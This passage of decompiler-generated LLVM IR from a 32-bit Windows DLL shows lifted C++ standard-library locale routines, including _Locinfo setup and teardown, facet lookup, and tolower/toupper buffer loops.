  %22 = inttoptr i32 %21 to i32*, !insn.addr !110
  store i32 0, i32* %22, align 4, !insn.addr !110
  %23 = add i32 %1, 40, !insn.addr !111
  %24 = inttoptr i32 %23 to i8*, !insn.addr !111
  store i8 0, i8* %24, align 1, !insn.addr !111
  %25 = add i32 %1, 44, !insn.addr !112
  %26 = inttoptr i32 %25 to i32*, !insn.addr !112
  store i32 0, i32* %26, align 4, !insn.addr !112
  %27 = add i32 %1, 48, !insn.addr !113
  %28 = inttoptr i32 %27 to i8*, !insn.addr !113
  store i8 0, i8* %28, align 1, !insn.addr !113
  %29 = icmp eq i8* %arg2, null, !insn.addr !114
  %30 = icmp eq i1 %29, false, !insn.addr !115
  store i32 %0, i32* %eax.0.reg2mem, !insn.addr !115
  store i32* %stack_var_-44, i32** %esp.0.in.reg2mem, !insn.addr !115
  br i1 %30, label %dec_label_pc_10001405, label %dec_label_pc_100013ea, !insn.addr !115

dec_label_pc_100013ea:                            ; preds = %dec_label_pc_10001370
  %31 = call i32 @function_100012f0(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10039c58, i32 0, i32 0)), !insn.addr !116
  %32 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !117
  store i32 %32, i32* %stack_var_-56, align 4, !insn.addr !117
  %33 = call i32 @"__CxxThrowException@8"(), !insn.addr !118
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !118
  store i32* %stack_var_-56, i32** %esp.0.in.reg2mem, !insn.addr !118
  br label %dec_label_pc_10001405, !insn.addr !118

dec_label_pc_10001405:                            ; preds = %dec_label_pc_100013ea, %dec_label_pc_10001370
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %34 = add i32 %esp.0, -4, !insn.addr !119
  %35 = inttoptr i32 %34 to i32*, !insn.addr !119
  store i32 %eax.0.reload, i32* %35, align 4, !insn.addr !119
  %36 = add i32 %esp.0, -8, !insn.addr !120
  %37 = inttoptr i32 %36 to i32*, !insn.addr !120
  store i32 %1, i32* %37, align 4, !insn.addr !120
  %38 = call i32 @"?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z"(i32* nonnull @4, i8* bitcast (i32* @4 to i8*)), !insn.addr !121
  %39 = load i32, i32* %stack_var_-16, align 4, !insn.addr !122
  call void @__writefsdword(i32 0, i32 %39), !insn.addr !123
  ret i32 %1, !insn.addr !124
}

define i32 @"??1_Locinfo@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001430:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !125
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !126
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !127
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !128
  %4 = xor i32 %3, %1, !insn.addr !129
  store i32 %4, i32* %stack_var_-24, align 4, !insn.addr !130
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !132
  %6 = inttoptr i32 %0 to i32*, !insn.addr !133
  %7 = call i32 @"?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z"(i32* %6), !insn.addr !133
  %8 = add i32 %0, 44, !insn.addr !134
  %9 = inttoptr i32 %8 to i32*, !insn.addr !134
  %10 = load i32, i32* %9, align 4, !insn.addr !134
  %11 = icmp eq i32 %10, 0, !insn.addr !135
  br i1 %11, label %dec_label_pc_1000146e, label %dec_label_pc_10001465, !insn.addr !136

dec_label_pc_10001465:                            ; preds = %dec_label_pc_10001430
  %12 = call i32 @_free(), !insn.addr !137
  br label %dec_label_pc_1000146e, !insn.addr !138

dec_label_pc_1000146e:                            ; preds = %dec_label_pc_10001465, %dec_label_pc_10001430
  store i32 0, i32* %9, align 4, !insn.addr !139
  %13 = add i32 %0, 36, !insn.addr !140
  %14 = inttoptr i32 %13 to i32*, !insn.addr !140
  %15 = load i32, i32* %14, align 4, !insn.addr !140
  %16 = icmp eq i32 %15, 0, !insn.addr !141
  br i1 %16, label %dec_label_pc_10001485, label %dec_label_pc_1000147c, !insn.addr !142

dec_label_pc_1000147c:                            ; preds = %dec_label_pc_1000146e
  %17 = call i32 @_free(), !insn.addr !143
  br label %dec_label_pc_10001485, !insn.addr !144

dec_label_pc_10001485:                            ; preds = %dec_label_pc_1000147c, %dec_label_pc_1000146e
  store i32 0, i32* %14, align 4, !insn.addr !145
  %18 = add i32 %0, 28, !insn.addr !146
  %19 = inttoptr i32 %18 to i32*, !insn.addr !146
  %20 = load i32, i32* %19, align 4, !insn.addr !146
  %21 = icmp eq i32 %20, 0, !insn.addr !147
  br i1 %21, label %dec_label_pc_1000149c, label %dec_label_pc_10001493, !insn.addr !148

dec_label_pc_10001493:                            ; preds = %dec_label_pc_10001485
  %22 = call i32 @_free(), !insn.addr !149
  br label %dec_label_pc_1000149c, !insn.addr !150

dec_label_pc_1000149c:                            ; preds = %dec_label_pc_10001493, %dec_label_pc_10001485
  %23 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !151
  store i32 0, i32* %19, align 4, !insn.addr !152
  %24 = add i32 %0, 20, !insn.addr !153
  %25 = inttoptr i32 %24 to i32*, !insn.addr !153
  %26 = load i32, i32* %25, align 4, !insn.addr !153
  %27 = icmp eq i32 %26, 0, !insn.addr !154
  br i1 %27, label %dec_label_pc_100014b3, label %dec_label_pc_100014aa, !insn.addr !155

dec_label_pc_100014aa:                            ; preds = %dec_label_pc_1000149c
  %28 = add i32 %23, -4, !insn.addr !156
  %29 = inttoptr i32 %28 to i32*, !insn.addr !156
  store i32 %26, i32* %29, align 4, !insn.addr !156
  %30 = call i32 @_free(), !insn.addr !157
  br label %dec_label_pc_100014b3, !insn.addr !158

dec_label_pc_100014b3:                            ; preds = %dec_label_pc_100014aa, %dec_label_pc_1000149c
  store i32 0, i32* %25, align 4, !insn.addr !159
  %31 = add i32 %0, 12, !insn.addr !160
  %32 = inttoptr i32 %31 to i32*, !insn.addr !160
  %33 = load i32, i32* %32, align 4, !insn.addr !160
  %34 = icmp eq i32 %33, 0, !insn.addr !161
  br i1 %34, label %dec_label_pc_100014ca, label %dec_label_pc_100014c1, !insn.addr !162

dec_label_pc_100014c1:                            ; preds = %dec_label_pc_100014b3
  %35 = add i32 %23, -4, !insn.addr !163
  %36 = inttoptr i32 %35 to i32*, !insn.addr !163
  store i32 %33, i32* %36, align 4, !insn.addr !163
  %37 = call i32 @_free(), !insn.addr !164
  br label %dec_label_pc_100014ca, !insn.addr !165

dec_label_pc_100014ca:                            ; preds = %dec_label_pc_100014c1, %dec_label_pc_100014b3
  store i32 0, i32* %32, align 4, !insn.addr !166
  %38 = add i32 %0, 4, !insn.addr !167
  %39 = inttoptr i32 %38 to i32*, !insn.addr !167
  %40 = load i32, i32* %39, align 4, !insn.addr !167
  %41 = icmp eq i32 %40, 0, !insn.addr !168
  br i1 %41, label %dec_label_pc_100014e1, label %dec_label_pc_100014d8, !insn.addr !169

dec_label_pc_100014d8:                            ; preds = %dec_label_pc_100014ca
  %42 = add i32 %23, -4, !insn.addr !170
  %43 = inttoptr i32 %42 to i32*, !insn.addr !170
  store i32 %40, i32* %43, align 4, !insn.addr !170
  %44 = call i32 @_free(), !insn.addr !171
  br label %dec_label_pc_100014e1, !insn.addr !172

dec_label_pc_100014e1:                            ; preds = %dec_label_pc_100014d8, %dec_label_pc_100014ca
  store i32 0, i32* %39, align 4, !insn.addr !173
  %45 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !174
  %46 = load i32, i32* %stack_var_-16, align 4, !insn.addr !175
  call void @__writefsdword(i32 0, i32 %46), !insn.addr !176
  ret i32 %45, !insn.addr !177
}

define i32 @function_10001500(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001500:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !178
  %3 = add i32 %0, 4, !insn.addr !179
  %4 = inttoptr i32 %0 to i32*, !insn.addr !180
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !180
  %5 = inttoptr i32 %3 to i64*, !insn.addr !181
  %6 = load i64, i64* %5, align 4, !insn.addr !181
  call void @__asm_movq.40(i64 %6, i128 %2), !insn.addr !181
  %7 = call i32 @___std_exception_copy(), !insn.addr !182
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %4, align 4, !insn.addr !183
  ret i32 %0, !insn.addr !184
}

define i32 @function_10001540(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001540:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !185
  %2 = icmp eq i8 %1, 0, !insn.addr !185
  %3 = inttoptr i32 %0 to i32*, !insn.addr !186
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %3, align 4, !insn.addr !186
  br i1 %2, label %dec_label_pc_1000155d, label %dec_label_pc_10001552, !insn.addr !187

dec_label_pc_10001552:                            ; preds = %dec_label_pc_10001540
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !188
  br label %dec_label_pc_1000155d, !insn.addr !189

dec_label_pc_1000155d:                            ; preds = %dec_label_pc_10001552, %dec_label_pc_10001540
  ret i32 %0, !insn.addr !190
}

define i32 @function_100015b0() {
dec_label_pc_100015b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 4, !insn.addr !191
  %3 = inttoptr i32 %2 to i32*, !insn.addr !191
  %4 = load i32, i32* %3, align 4, !insn.addr !191
  %5 = add i32 %4, 1, !insn.addr !191
  store i32 %5, i32* %3, align 4, !insn.addr !191
  ret i32 %1, !insn.addr !192
}

define i32 @function_100015c0() {
dec_label_pc_100015c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !193
  %2 = inttoptr i32 %1 to i32*, !insn.addr !193
  %3 = load i32, i32* %2, align 4, !insn.addr !193
  %4 = add i32 %3, -1, !insn.addr !193
  %5 = icmp eq i32 %4, 0, !insn.addr !193
  store i32 %4, i32* %2, align 4, !insn.addr !193
  %6 = select i1 %5, i32 %0, i32 0, !insn.addr !194
  ret i32 %6, !insn.addr !195
}

define i32 @function_100015e0() local_unnamed_addr {
dec_label_pc_100015e0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = inttoptr i32 %0 to i32*, !insn.addr !196
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %2, align 4, !insn.addr !196
  ret i32 %1, !insn.addr !197
}

define i32 @"??1locale@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_100015f0:
  %eax.0.reg2mem = alloca i32, !insn.addr !198
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !199
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !200
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !201
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !202
  %3 = add i32 %0, 4, !insn.addr !203
  %4 = inttoptr i32 %3 to i32*, !insn.addr !203
  %5 = load i32, i32* %4, align 4, !insn.addr !203
  %6 = icmp eq i32 %5, 0, !insn.addr !204
  store i32 %2, i32* %eax.0.reg2mem, !insn.addr !205
  br i1 %6, label %dec_label_pc_1000162a, label %dec_label_pc_10001619, !insn.addr !205

dec_label_pc_10001619:                            ; preds = %dec_label_pc_100015f0
  %7 = inttoptr i32 %5 to i32*, !insn.addr !206
  %8 = load i32, i32* %7, align 4, !insn.addr !206
  store i32 %8, i32* %eax.0.reg2mem
  br label %dec_label_pc_1000162a

dec_label_pc_1000162a:                            ; preds = %dec_label_pc_10001619, %dec_label_pc_100015f0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %9 = load i32, i32* %stack_var_-16, align 4, !insn.addr !207
  call void @__writefsdword(i32 0, i32 %9), !insn.addr !208
  ret i32 %eax.0.reload, !insn.addr !209
}

define i8* @"?c_str@locale@std@@QBEPBDXZ"() local_unnamed_addr {
dec_label_pc_10001640:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !210
  %2 = inttoptr i32 %1 to i32*, !insn.addr !210
  %3 = load i32, i32* %2, align 4, !insn.addr !210
  %4 = icmp eq i32 %3, 0, !insn.addr !211
  %5 = icmp eq i1 %4, false, !insn.addr !212
  br i1 %5, label %dec_label_pc_1000164d, label %dec_label_pc_10001647, !insn.addr !212

dec_label_pc_10001647:                            ; preds = %dec_label_pc_10001640
  ret i8* bitcast (i8** @global_var_10039c75 to i8*), !insn.addr !213

dec_label_pc_1000164d:                            ; preds = %dec_label_pc_10001640
  %6 = add i32 %3, 24, !insn.addr !214
  %7 = inttoptr i32 %6 to i32*, !insn.addr !214
  %8 = load i32, i32* %7, align 4, !insn.addr !214
  %9 = icmp eq i32 %8, 0, !insn.addr !215
  br i1 %9, label %dec_label_pc_10001657, label %dec_label_pc_10001654, !insn.addr !216

dec_label_pc_10001654:                            ; preds = %dec_label_pc_1000164d
  %10 = inttoptr i32 %8 to i8*, !insn.addr !217
  ret i8* %10, !insn.addr !217

dec_label_pc_10001657:                            ; preds = %dec_label_pc_1000164d
  %11 = add i32 %3, 28, !insn.addr !218
  %12 = inttoptr i32 %11 to i8*, !insn.addr !219
  ret i8* %12, !insn.addr !219
}

define i32* @"?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z"(i32* %result, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001660:
  %eax.1.reg2mem = alloca i32, !insn.addr !220
  %eax.0.reg2mem = alloca i32, !insn.addr !220
  %0 = ptrtoint i32* %result to i32
  %1 = add i32 %0, 4, !insn.addr !221
  %2 = inttoptr i32 %1 to i32*, !insn.addr !221
  %3 = load i32, i32* %2, align 4, !insn.addr !221
  %4 = add i32 %3, 12, !insn.addr !222
  %5 = inttoptr i32 %4 to i32*, !insn.addr !222
  %6 = load i32, i32* %5, align 4, !insn.addr !222
  %7 = icmp ugt i32 %6, %arg2, !insn.addr !222
  %8 = icmp eq i1 %7, false, !insn.addr !223
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !223
  br i1 %8, label %dec_label_pc_1000167d, label %dec_label_pc_1000166f, !insn.addr !223

dec_label_pc_1000166f:                            ; preds = %dec_label_pc_10001660
  %9 = add i32 %3, 8, !insn.addr !224
  %10 = inttoptr i32 %9 to i32*, !insn.addr !224
  %11 = load i32, i32* %10, align 4, !insn.addr !224
  %12 = mul i32 %arg2, 4, !insn.addr !225
  %13 = add i32 %11, %12, !insn.addr !225
  %14 = inttoptr i32 %13 to i32*, !insn.addr !225
  %15 = load i32, i32* %14, align 4, !insn.addr !225
  %16 = icmp eq i32 %15, 0, !insn.addr !226
  %17 = icmp eq i1 %16, false, !insn.addr !227
  store i32 %15, i32* %eax.0.reg2mem, !insn.addr !227
  store i32 %15, i32* %eax.1.reg2mem, !insn.addr !227
  br i1 %17, label %dec_label_pc_1000169a, label %dec_label_pc_1000167d, !insn.addr !227

dec_label_pc_1000167d:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_1000166f
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = add i32 %3, 20, !insn.addr !228
  %19 = inttoptr i32 %18 to i8*, !insn.addr !228
  %20 = load i8, i8* %19, align 1, !insn.addr !228
  %21 = icmp eq i8 %20, 0, !insn.addr !228
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !229
  br i1 %21, label %dec_label_pc_1000169a, label %dec_label_pc_10001683, !insn.addr !229

dec_label_pc_10001683:                            ; preds = %dec_label_pc_1000167d
  %22 = call i32 @function_1000ff62(), !insn.addr !230
  %23 = add i32 %22, 12, !insn.addr !231
  %24 = inttoptr i32 %23 to i32*, !insn.addr !231
  %25 = load i32, i32* %24, align 4, !insn.addr !231
  %26 = icmp ugt i32 %25, %arg2, !insn.addr !231
  %27 = icmp eq i1 %26, false, !insn.addr !232
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !232
  br i1 %27, label %dec_label_pc_1000169a, label %dec_label_pc_1000168d, !insn.addr !232

dec_label_pc_1000168d:                            ; preds = %dec_label_pc_10001683
  %28 = add i32 %22, 8, !insn.addr !233
  %29 = inttoptr i32 %28 to i32*, !insn.addr !233
  %30 = load i32, i32* %29, align 4, !insn.addr !233
  %31 = mul i32 %arg2, 4, !insn.addr !234
  %32 = add i32 %30, %31, !insn.addr !234
  %33 = inttoptr i32 %32 to i32*, !insn.addr !234
  %34 = load i32, i32* %33, align 4, !insn.addr !234
  %35 = inttoptr i32 %34 to i32*, !insn.addr !235
  ret i32* %35, !insn.addr !235

dec_label_pc_1000169a:                            ; preds = %dec_label_pc_10001683, %dec_label_pc_1000167d, %dec_label_pc_1000166f
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %36 = inttoptr i32 %eax.1.reload to i32*, !insn.addr !236
  ret i32* %36, !insn.addr !236
}

define i32 @function_100016a0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100016a0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !237
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !238
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !239
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !240
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !241
  %2 = icmp eq i32 %arg2, 0, !insn.addr !242
  br i1 %2, label %dec_label_pc_10001752, label %dec_label_pc_100016e9, !insn.addr !243

dec_label_pc_100016e9:                            ; preds = %dec_label_pc_100016a0
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !244
  %4 = load i32, i32* %3, align 4, !insn.addr !244
  %5 = icmp eq i32 %4, 0, !insn.addr !244
  %6 = icmp eq i1 %5, false, !insn.addr !245
  br i1 %6, label %dec_label_pc_10001752, label %dec_label_pc_100016ee, !insn.addr !245

dec_label_pc_100016ee:                            ; preds = %dec_label_pc_100016e9
  %7 = call i32 @"??2@YAPAXI@Z"(i32 24), !insn.addr !246
  %8 = add i32 %arg3, 4, !insn.addr !247
  %9 = inttoptr i32 %8 to i32*, !insn.addr !247
  %10 = load i32, i32* %9, align 4, !insn.addr !247
  %11 = icmp eq i32 %10, 0, !insn.addr !248
  %12 = icmp eq i1 %11, false, !insn.addr !249
  store i32 ptrtoint (i8** @global_var_10039c75 to i32), i32* %ecx.0.reg2mem, !insn.addr !249
  br i1 %12, label %dec_label_pc_10001715, label %dec_label_pc_1000171f, !insn.addr !249

dec_label_pc_10001715:                            ; preds = %dec_label_pc_100016ee
  %13 = add i32 %10, 24, !insn.addr !250
  %14 = inttoptr i32 %13 to i32*, !insn.addr !250
  %15 = load i32, i32* %14, align 4, !insn.addr !250
  %16 = icmp eq i32 %15, 0, !insn.addr !251
  %17 = icmp eq i1 %16, false, !insn.addr !252
  %18 = add i32 %10, 28
  %spec.select = select i1 %17, i32 %15, i32 %18
  store i32 %spec.select, i32* %ecx.0.reg2mem
  br label %dec_label_pc_1000171f

dec_label_pc_1000171f:                            ; preds = %dec_label_pc_10001715, %dec_label_pc_100016ee
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %19 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !253
  %20 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-108, i8* %19), !insn.addr !254
  %21 = add i32 %7, 4, !insn.addr !255
  %22 = inttoptr i32 %21 to i32*, !insn.addr !255
  store i32 0, i32* %22, align 4, !insn.addr !255
  %23 = inttoptr i32 %7 to i32*, !insn.addr !256
  store i32 ptrtoint (i32* @global_var_1002d3e8 to i32), i32* %23, align 4, !insn.addr !256
  %24 = call i32 @__Getctype(i32* nonnull %stack_var_-56), !insn.addr !257
  %25 = inttoptr i32 %24 to i128*, !insn.addr !258
  %26 = load i128, i128* %25, align 4, !insn.addr !258
  %27 = call i128 @__asm_movups.44(i128 %26), !insn.addr !258
  %28 = add i32 %7, 8, !insn.addr !259
  %29 = inttoptr i32 %28 to i128*, !insn.addr !259
  %30 = load i128, i128* %29, align 4, !insn.addr !259
  call void @__asm_movups(i128 %30, i128 %27), !insn.addr !259
  store i32 %7, i32* %3, align 4, !insn.addr !260
  %31 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !261
  br label %dec_label_pc_10001752, !insn.addr !261

dec_label_pc_10001752:                            ; preds = %dec_label_pc_1000171f, %dec_label_pc_100016e9, %dec_label_pc_100016a0
  %32 = load i32, i32* %stack_var_-28, align 4, !insn.addr !262
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !263
  ret i32 2, !insn.addr !264
}

define i32 @function_10001770(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001770:
  %0 = call i32 @__Tolower(), !insn.addr !265
  ret i32 %0, !insn.addr !266
}

define i32 @function_10001790(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001790:
  %esi.1.reg2mem = alloca i32, !insn.addr !267
  %edi.0.reg2mem = alloca i32, !insn.addr !267
  %esi.0.reg2mem = alloca i32, !insn.addr !267
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !268
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !269
  br i1 %4, label %dec_label_pc_100017ca, label %dec_label_pc_100017ac, !insn.addr !269

dec_label_pc_100017ac:                            ; preds = %dec_label_pc_10001790
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !270
  %6 = add i32 %0, 8, !insn.addr !271
  %7 = add i32 %5, -4, !insn.addr !272
  %8 = inttoptr i32 %7 to i32*, !insn.addr !272
  %9 = add i32 %5, -8, !insn.addr !273
  %10 = inttoptr i32 %9 to i32*, !insn.addr !273
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !274
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !274
  br label %dec_label_pc_100017b2, !insn.addr !274

dec_label_pc_100017b2:                            ; preds = %dec_label_pc_100017b2, %dec_label_pc_100017ac
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !272
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !275
  %12 = load i8, i8* %11, align 1, !insn.addr !275
  %13 = zext i8 %12 to i32, !insn.addr !275
  store i32 %13, i32* %10, align 4, !insn.addr !273
  %14 = call i32 @__Tolower(), !insn.addr !276
  %15 = trunc i32 %14 to i8, !insn.addr !277
  store i8 %15, i8* %11, align 1, !insn.addr !277
  %16 = add i32 %edi.0.reload, 1, !insn.addr !278
  %17 = add i32 %esi.0.reload, 1, !insn.addr !279
  %18 = icmp eq i32 %16, %3, !insn.addr !280
  %19 = icmp eq i1 %18, false, !insn.addr !281
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !281
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !281
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !281
  br i1 %19, label %dec_label_pc_100017b2, label %dec_label_pc_100017ca, !insn.addr !281

dec_label_pc_100017ca:                            ; preds = %dec_label_pc_100017b2, %dec_label_pc_10001790
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !282
}

define i32 @function_100017e0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100017e0:
  %0 = call i32 @__Toupper(), !insn.addr !283
  ret i32 %0, !insn.addr !284
}

define i32 @function_10001800(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001800:
  %esi.1.reg2mem = alloca i32, !insn.addr !285
  %edi.0.reg2mem = alloca i32, !insn.addr !285
  %esi.0.reg2mem = alloca i32, !insn.addr !285
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !286
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !287
  br i1 %4, label %dec_label_pc_1000183a, label %dec_label_pc_1000181c, !insn.addr !287

dec_label_pc_1000181c:                            ; preds = %dec_label_pc_10001800
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !288
  %6 = add i32 %0, 8, !insn.addr !289
  %7 = add i32 %5, -4, !insn.addr !290
  %8 = inttoptr i32 %7 to i32*, !insn.addr !290
  %9 = add i32 %5, -8, !insn.addr !291
  %10 = inttoptr i32 %9 to i32*, !insn.addr !291
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !292
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !292
  br label %dec_label_pc_10001822, !insn.addr !292

dec_label_pc_10001822:                            ; preds = %dec_label_pc_10001822, %dec_label_pc_1000181c
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !290
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !293
  %12 = load i8, i8* %11, align 1, !insn.addr !293
  %13 = zext i8 %12 to i32, !insn.addr !293
  store i32 %13, i32* %10, align 4, !insn.addr !291
  %14 = call i32 @__Toupper(), !insn.addr !294
  %15 = trunc i32 %14 to i8, !insn.addr !295
  store i8 %15, i8* %11, align 1, !insn.addr !295
  %16 = add i32 %edi.0.reload, 1, !insn.addr !296
  %17 = add i32 %esi.0.reload, 1, !insn.addr !297
  %18 = icmp eq i32 %16, %3, !insn.addr !298
  %19 = icmp eq i1 %18, false, !insn.addr !299
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !299
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !299
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !299
  br i1 %19, label %dec_label_pc_10001822, label %dec_label_pc_1000183a, !insn.addr !299

dec_label_pc_1000183a:                            ; preds = %dec_label_pc_10001822, %dec_label_pc_10001800
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !300
}

define i32 @function_10001850(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001850:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !301
  %2 = and i32 %0, -256, !insn.addr !301
  %3 = or i32 %2, %1, !insn.addr !301
  ret i32 %3, !insn.addr !302
}

define i32 @function_10001860(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001860:
  %0 = call i32 @_memcpy.12(), !insn.addr !303
  ret i32 %arg2, !insn.addr !304
}

define i32 @function_10001880(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001880:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !305
  %2 = and i32 %0, -256, !insn.addr !305
  %3 = or i32 %2, %1, !insn.addr !305
  ret i32 %3, !insn.addr !306
}

define i32 @function_10001890(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001890:
  %0 = call i32 @_memcpy.12(), !insn.addr !307
  ret i32 %arg2, !insn.addr !308
}

define i32 @function_100018b0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100018b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !309
  %2 = inttoptr i32 %1 to i32*, !insn.addr !309
  %3 = load i32, i32* %2, align 4, !insn.addr !309
  %4 = inttoptr i32 %0 to i32*, !insn.addr !310
  store i32 ptrtoint (i32* @global_var_1002d3e8 to i32), i32* %4, align 4, !insn.addr !310
  %5 = icmp slt i32 %3, 1
  br i1 %5, label %dec_label_pc_100018cd, label %dec_label_pc_100018c3, !insn.addr !311

dec_label_pc_100018c3:                            ; preds = %dec_label_pc_100018b0
  %6 = call i32 @_free(), !insn.addr !312
  br label %dec_label_pc_100018da, !insn.addr !313

dec_label_pc_100018cd:                            ; preds = %dec_label_pc_100018b0
  %7 = icmp ne i32 %3, 0, !insn.addr !314
  %8 = icmp eq i1 %7, false, !insn.addr !315
  br i1 %8, label %dec_label_pc_100018da, label %dec_label_pc_100018cf, !insn.addr !315

dec_label_pc_100018cf:                            ; preds = %dec_label_pc_100018cd
  %9 = call i32 @function_10011316(), !insn.addr !316
  br label %dec_label_pc_100018da, !insn.addr !316

dec_label_pc_100018da:                            ; preds = %dec_label_pc_100018c3, %dec_label_pc_100018cf, %dec_label_pc_100018cd
  %10 = call i32 @_free(), !insn.addr !317
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %4, align 4, !insn.addr !318
  %11 = and i8 %arg1, 1, !insn.addr !319
  %12 = icmp eq i8 %11, 0, !insn.addr !319
